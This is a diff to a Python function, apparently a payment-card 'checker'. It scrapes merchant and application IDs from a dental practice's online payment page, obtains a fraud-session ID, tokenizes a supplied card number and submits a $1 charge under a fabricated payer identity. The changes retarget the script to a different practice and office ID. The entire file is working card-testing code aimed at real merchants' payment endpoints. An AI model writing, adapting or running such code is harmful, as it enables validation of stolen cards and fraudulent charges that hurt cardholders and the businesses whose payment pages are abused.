@@ -45,7 +45,7 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	response = session.get('https://app.thebilling.company/makdentalgroup-eaton/payment-link', headers=headers)
+	response = requests.get('https://app.thebilling.company/downtown-dental/payment-link', headers=headers)
 	
 	merchantId = re.search(r'"merchantId":"(.*?)"', response.text).group(1)
 	appId = re.search(r'"appId":"(.*?)"', response.text).group(1)
@@ -69,7 +69,7 @@ def Tele(ccx):
 	    'merchant_id': f'{merchantId}',
 	}
 	
-	response = session.get('https://finix.live-payments-api.com/fraud/sessions', params=params, headers=headers)
+	response = requests.get('https://finix.live-payments-api.com/fraud/sessions', params=params, headers=headers)
 	
 	session_id = response.json()['session_id']
 	
@@ -103,7 +103,7 @@ def Tele(ccx):
 	    },
 	}
 	
-	response = session.post(
+	response = requests.post(
 	    f'https://internal.live-payments-api.com/applications/{appId}/tokens',
 	    headers=headers,
 	    json=json_data,
@@ -117,7 +117,7 @@ def Tele(ccx):
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/json',
 	    'origin': 'https://app.thebilling.company',
-	    'referer': 'https://app.thebilling.company/makdentalgroup-eaton/payment-link',
+	    'referer': 'https://app.thebilling.company/downtown-dental/payment-link',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -137,18 +137,18 @@ def Tele(ccx):
 	            'amount': 1,
 	            'firstName': 'Rodam',
 	            'lastName': 'User',
-	            'dob': '10/03/2001',
+	            'dob': '03/04/2001',
 	            'email': 'rodamuser08@gmail.com',
 	            'phone': '(430)300-0850',
 	            'note': '',
-	            'officeId': 132,
+	            'officeId': 162,
 	            'token': f'{tok}',
 	            'sessionId': f'{session_id}',
 	        },
 	    },
 	}
 	
-	response = session.post(
+	response = requests.post(
 	    'https://app.thebilling.company/api/trpc/viewer.payments.processOnlinePayment',
 	    params=params,
 	    headers=headers,
